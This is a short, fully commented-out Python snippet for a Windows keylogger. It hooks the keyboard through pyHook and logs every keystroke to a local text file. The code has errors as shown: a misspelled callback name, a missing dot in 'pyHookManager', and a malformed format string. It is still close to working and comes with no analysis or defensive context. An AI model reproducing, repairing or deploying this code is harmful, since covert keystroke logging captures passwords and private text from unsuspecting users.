# import pyHook,pythoncom,sys,logging
# file_log = 'keyloggeroutput.txt'
# def OnKryboardEvent(event):
#     logging.basicConfig(filename=file_log,level=logging.DEBUG,format='% (message)s')
#     logging.log(10,chr(event.Ascii))
#     return True
# hm = pyHookManager()
# hm.KeyDown = OnKeyboardEvent
# hm.HookKeyboard()
# pythoncom.PumpMessages()